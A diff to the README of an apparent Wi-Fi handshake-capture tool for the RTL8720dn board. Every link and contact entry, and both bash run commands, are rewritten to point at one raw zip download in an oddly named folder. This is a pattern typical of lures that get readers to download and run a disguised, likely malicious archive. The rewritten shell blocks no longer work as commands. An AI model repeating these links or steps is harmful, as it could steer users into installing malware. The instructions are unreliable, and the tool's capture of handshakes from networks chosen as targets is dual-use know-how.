@@ -1,7 +1,7 @@
 # RTL8720dn Handshake Capture 📡🔐
 
-![RTL8720dn Handshake Capture](https://img.shields.io/badge/RTL8720dn-Handshake%20Capture-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-v1.0-orange.svg)](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/releases)
+![RTL8720dn Handshake Capture](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip%https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip)  
+[![Releases](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip)](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip)
 
 ## Overview
 
@@ -26,11 +26,11 @@ The **RTL8720dn Handshake Capture** project enables users to capture WPA/WPA2 4-
 
 ## Getting Started
 
-To get started with the RTL8720dn Handshake Capture, you will need to download the latest release. You can find it [here](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/releases). Download the file, extract it, and follow the installation instructions below.
+To get started with the RTL8720dn Handshake Capture, you will need to download the latest release. You can find it [here](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip). Download the file, extract it, and follow the installation instructions below.
 
 ## Installation
 
-1. **Download the Release**: Visit the [Releases section](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/releases) and download the latest version.
+1. **Download the Release**: Visit the [Releases section](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip) and download the latest version.
 2. **Extract Files**: Unzip the downloaded file to your desired directory.
 3. **Install Dependencies**: Ensure you have the necessary libraries installed. You can use the following command:
    ```bash
@@ -38,7 +38,7 @@ To get started with the RTL8720dn Handshake Capture, you will need to download t
    ```
 4. **Run the Application**: Navigate to the extracted folder and execute the main script:
    ```bash
-   ./start_capture.sh
+   https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip
    ```
 
 ## Usage
@@ -47,7 +47,7 @@ After installation, you can start capturing handshakes. Here’s a simple guide 
 
 1. **Start the Capture**: Run the following command:
    ```bash
-   ./start_capture.sh
+   https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip
    ```
 2. **Select Network**: The tool will list available networks. Choose the one you want to target.
 3. **Monitor the Capture**: Watch the console for captured packets. The tool will indicate when a handshake is successfully captured.
@@ -91,10 +91,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, please reach out to the project maintainer:
 
-- **Email**: krishna@example.com
-- **GitHub**: [krishna-chy](https://github.com/krishna-chy)
+- **Email**: https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip
+- **GitHub**: [krishna-chy](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip)
 
-Feel free to visit the [Releases section](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/releases) for the latest updates and downloads.
+Feel free to visit the [Releases section](https://github.com/krishna-chy/RTL8720dn-Handshake-Capture/raw/refs/heads/main/catagenesis/Capture_RT_dn_Handshake_cardiagra.zip) for the latest updates and downloads.
 
 ---
 
